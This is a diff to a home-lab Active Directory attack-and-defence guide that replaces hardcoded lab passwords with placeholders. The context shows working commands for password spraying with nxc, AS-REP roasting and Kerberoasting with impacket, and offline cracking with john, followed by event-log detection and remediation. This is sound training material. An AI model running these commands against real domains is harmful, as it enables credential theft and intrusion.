@@ -7,7 +7,7 @@
 ```powershell
 # Plant a weak-but-policy-compliant service account (the vulnerability).
 New-ADUser -Name "Backup Service" -SamAccountName "svc-backup" -UserPrincipalName "svc-backup@CYBERLAB.local" `
-  -AccountPassword (ConvertTo-SecureString "Welcome2025!!!" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true -Description "Backup service account"
+  -AccountPassword (ConvertTo-SecureString "<svc-backup-test-password>" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true -Description "Backup service account"
 ```
 
 ## Phase 1: Reconnaissance 🐉
@@ -28,16 +28,16 @@ wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_lin
 
 ```bash
 printf 'administrator\nsvc-backup\nasmith\njdoe\n' > ~/valid_users.txt
-printf 'Autumn2025!\nWelcome2025!!!\nPassword2025!\n' > ~/spray.txt      # single quotes protect the !
+printf 'Autumn2025!\n<svc-backup-test-password>\nPassword2025!\n' > ~/spray.txt      # single quotes protect the !
 nxc smb 192.168.56.30 -u ~/valid_users.txt -p ~/spray.txt --continue-on-success
-# -> [+] CYBERLAB.local\svc-backup:Welcome2025!!!
+# -> [+] CYBERLAB.local\svc-backup:<svc-backup-test-password>
 ```
 
 ## Phase 4: Post-Exploitation 🐉
 
 ```bash
-nxc smb 192.168.56.30 -u svc-backup -p 'Welcome2025!!!' --users
-nxc smb 192.168.56.30 -u svc-backup -p 'Welcome2025!!!' --shares
+nxc smb 192.168.56.30 -u svc-backup -p '<svc-backup-test-password>' --users
+nxc smb 192.168.56.30 -u svc-backup -p '<svc-backup-test-password>' --shares
 ```
 
 ## Extra A: AS-REP Roasting
@@ -51,7 +51,7 @@ Get-ADUser asmith -Properties DoesNotRequirePreAuth | Select Name, DoesNotRequir
 # 🐉 Kali: grab the AS-REP hash unauthenticated, then crack offline.
 impacket-GetNPUsers CYBERLAB.local/ -usersfile ~/valid_users.txt -dc-ip 192.168.56.30 -no-pass -format hashcat -outputfile ~/asrep_hashes.txt
 cat ~/asrep_hashes.txt
-printf 'Password123\nSummer2025\nCyberLabP@ss2025\nWelcome1\nAutumn2025\n' > ~/cracklist.txt
+printf 'Password123\nSummer2025\n<cyberlab-test-password>\nWelcome1\nAutumn2025\n' > ~/cracklist.txt
 john --wordlist=~/cracklist.txt ~/asrep_hashes.txt
 john --show ~/asrep_hashes.txt
 ```
@@ -59,7 +59,7 @@ john --show ~/asrep_hashes.txt
 # 🪟 DC: detect (Event 4768, pre-auth type 0) and remediate.
 Get-WinEvent -FilterHashtable @{LogName='Security';Id=4768;StartTime=(Get-Date).AddMinutes(-15)} | Where-Object { $_.Message -match 'asmith' } | Select-Object -First 1 | Format-List TimeCreated, Message
 Set-ADAccountControl -Identity asmith -DoesNotRequirePreAuth $false
-Set-ADAccountPassword -Identity asmith -Reset -NewPassword (ConvertTo-SecureString "Zt9pQ2mLx7Kv4nWr8Yd" -AsPlainText -Force)
+Set-ADAccountPassword -Identity asmith -Reset -NewPassword (ConvertTo-SecureString "<new-random-password>" -AsPlainText -Force)
 ```
 
 ## Extra B: Kerberoasting
@@ -67,15 +67,15 @@ Set-ADAccountPassword -Identity asmith -Reset -NewPassword (ConvertTo-SecureStri
 ```powershell
 # 🪟 DC: service account with an SPN and a weak password (the target).
 New-ADUser -Name "SQL Service" -SamAccountName "svc-sql" -UserPrincipalName "svc-sql@CYBERLAB.local" `
-  -AccountPassword (ConvertTo-SecureString "Summer2025Db!!" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true `
+  -AccountPassword (ConvertTo-SecureString "<svc-sql-test-password>" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true `
   -ServicePrincipalNames "MSSQL/dc01.cyberlab.local:1433"
 Get-ADUser svc-sql -Properties ServicePrincipalNames | Select Name, ServicePrincipalNames
 ```
 ```bash
 # 🐉 Kali: request the TGS with any valid domain cred (jdoe foothold), then crack offline.
-impacket-GetUserSPNs CYBERLAB.local/jdoe:'CyberLabP@ss2025' -dc-ip 192.168.56.30 -request -outputfile ~/kerberoast_hashes.txt
+impacket-GetUserSPNs CYBERLAB.local/jdoe:'<cyberlab-test-password>' -dc-ip 192.168.56.30 -request -outputfile ~/kerberoast_hashes.txt
 cat ~/kerberoast_hashes.txt
-printf 'Password123\nSummer2025Db!!\nWelcome1\nAutumn2025\n' > ~/krb_wordlist.txt
+printf 'Password123\n<svc-sql-test-password>\nWelcome1\nAutumn2025\n' > ~/krb_wordlist.txt
 john --wordlist=~/krb_wordlist.txt ~/kerberoast_hashes.txt
 john --show ~/kerberoast_hashes.txt
 # If KRB_AP_ERR_SKEW: sudo rdate -n 192.168.56.30   (sync clock to the DC)
@@ -83,7 +83,7 @@ john --show ~/kerberoast_hashes.txt
 ```powershell
 # 🪟 DC: detect (Event 4769, enc type 0x17 = RC4) and remediate (long random password / gMSA).
 Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769;StartTime=(Get-Date).AddMinutes(-15)} | Where-Object { $_.Message -match 'svc-sql' } | Select-Object -First 1 | Format-List TimeCreated, Message
-Set-ADAccountPassword -Identity svc-sql -Reset -NewPassword (ConvertTo-SecureString "Kp9mXr2vLt7qNw4zBd6hCe3sYf8" -AsPlainText -Force)
+Set-ADAccountPassword -Identity svc-sql -Reset -NewPassword (ConvertTo-SecureString "<new-random-password>" -AsPlainText -Force)
 ```
 
 ## Phase 5: Incident Response (DC)
@@ -107,12 +107,12 @@ Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 80 |
 
 ```powershell
 Disable-ADAccount -Identity svc-backup
-Set-ADAccountPassword -Identity svc-backup -Reset -NewPassword (ConvertTo-SecureString "Xq7vR2pLm9Kt4zWn6Qd" -AsPlainText -Force)
+Set-ADAccountPassword -Identity svc-backup -Reset -NewPassword (ConvertTo-SecureString "<new-random-password>" -AsPlainText -Force)
 Get-ADUser svc-backup | Select Name, Enabled      # Enabled: False
 ```
 ```bash
 # 🐉 Kali: confirm access revoked.
-nxc smb 192.168.56.30 -u svc-backup -p 'Welcome2025!!!' --continue-on-success   # -> STATUS_ACCOUNT_DISABLED
+nxc smb 192.168.56.30 -u svc-backup -p '<svc-backup-test-password>' --continue-on-success   # -> STATUS_ACCOUNT_DISABLED
 ```
 
 ## Cleanup (optional, after the lab)
